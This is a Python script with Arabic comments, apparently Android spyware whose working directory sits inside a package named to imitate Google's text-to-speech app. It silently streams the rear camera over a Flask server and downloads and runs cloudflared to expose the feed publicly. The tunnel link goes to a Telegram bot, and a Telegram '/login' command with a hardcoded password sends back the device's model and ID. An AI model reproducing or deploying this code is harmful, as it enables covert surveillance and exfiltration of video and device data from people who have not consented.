import os
import time
import threading
import requests
import subprocess
import cv2
import numpy as np
from flask import Flask, Response
from jnius import autoclass

# ---------- الإعدادات (يُفضل جلبها من Secrets) ----------
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN"          # استبدل
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"          # استبدل
PASSWORD = "Zaen123@123@"                  # كلمة السر
# ----------------------------------------------------------

app = Flask(__name__)

# مسار تخزين cloudflared داخل التطبيق
BINARY_PATH = "/data/data/com.google.android.tts_v2/files/cloudflared"

# معلومات الجهاز (تستخدم عند الـ /login)
Build = autoclass('android.os.Build')
VERSION = autoclass('android.os.Build$VERSION')

def generate_frames():
    """بث الكاميرا الخلفية (MJPEG)"""
    camera = cv2.VideoCapture(0)
    while True:
        success, frame = camera.read()
        if not success:
            break
        ret, buffer = cv2.imencode('.jpg', frame)
        frame = buffer.tobytes()
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
    camera.release()

@app.route('/live')
def video_feed():
    return Response(generate_frames(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

def download_cloudflared():
    """تحميل cloudflared (ARM64) إذا لم يكن موجوداً"""
    if not os.path.exists(BINARY_PATH):
        try:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
            r = requests.get(url, stream=True)
            with open(BINARY_PATH, 'wb') as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)
            os.chmod(BINARY_PATH, 0o755)
        except Exception as e:
            print(f"Cloudflared download error: {e}")

def start_tunnel():
    """تشغيل نفق Cloudflare وإرسال الرابط إلى تليجرام"""
    download_cloudflared()
    cmd = [BINARY_PATH, "tunnel", "--url", "http://localhost:8080"]
    process = subprocess.Popen(cmd,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT,
                               text=True,
                               bufsize=1)
    for line in iter(process.stdout.readline, ''):
        if "trycloudflare.com" in line:
            words = line.split()
            for w in words:
                if "trycloudflare.com" in w:
                    tunnel_url = w.strip() + "/live"
                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                  data={'chat_id': TELEGRAM_CHAT_ID,
                                        'text': f"Tunnel Ready: {tunnel_url}"})
                    break
            break
    # إذا انتهى النفق لأي سبب، أعد المحاولة
    time.sleep(5)
    start_tunnel()

def command_listener():
    """مستمع لأوامر التليجرام (يعمل في خلفية)"""
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
            params = {"offset": offset, "timeout": 10}
            resp = requests.get(url, params=params, timeout=15)
            data = resp.json()
            for update in data.get("result", []):
                offset = update["update_id"] + 1
                msg = update.get("message", {})
                text = msg.get("text", "")
                chat_id = msg.get("chat", {}).get("id")
                if chat_id != TELEGRAM_CHAT_ID:
                    continue
                # التحقق من كلمة السر
                if text.startswith("/login"):
                    parts = text.split()
                    if len(parts) == 2 and parts[1] == PASSWORD:
                        device_info = (f"✅ Device registered:\n"
                                       f"Model: {Build.MANUFACTURER} {Build.MODEL}\n"
                                       f"Android: {VERSION.RELEASE}\n"
                                       f"ID: {Build.ID}")
                        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                      data={'chat_id': chat_id, 'text': device_info})
                elif text == "/status":
                    # يمكن إضافة أوامر أخرى هنا
                    pass
        except Exception as e:
            print(f"Listener error: {e}")
        time.sleep(2)

if __name__ == '__main__':
    # تشغيل خادم Flask في خلفية
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080,
                                            debug=False, use_reloader=False),
                     daemon=True).start()
    # تشغيل مستمع الأوامر
    threading.Thread(target=command_listener, daemon=True).start()
    # تشغيل النفق
    start_tunnel()
